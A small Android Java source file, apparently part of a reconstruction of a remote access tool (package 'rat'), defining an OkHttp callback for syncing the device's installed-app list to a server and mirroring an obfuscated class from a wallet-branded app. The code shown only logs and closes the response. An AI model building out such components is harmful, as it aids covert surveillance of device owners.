package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.s (PackagesCallback)

import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * PackagesCallback - 已安装应用同步回调
 * vendor: 解析 ApiResult<Boolean>，成功后标记 syncPackages，日志 "设备已安装应用同步完成"
 */
public final class s implements Callback {

    private static final String TAG = "PackagesCallback";

    @Override
    public void onFailure(Call call, IOException e) {
        Log.e(TAG, "request failed", e);
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        try {
            String body = response.body() != null ? response.body().string() : "";
            Log.d(TAG, "response: " + response.code());
            // ADAPT: vendor parses ApiResult<Boolean>, logs "设备已安装应用同步完成", saves syncPackages flag
        } catch (Exception e) {
            Log.e(TAG, "parse error", e);
        } finally {
            response.close();
        }
    }
}
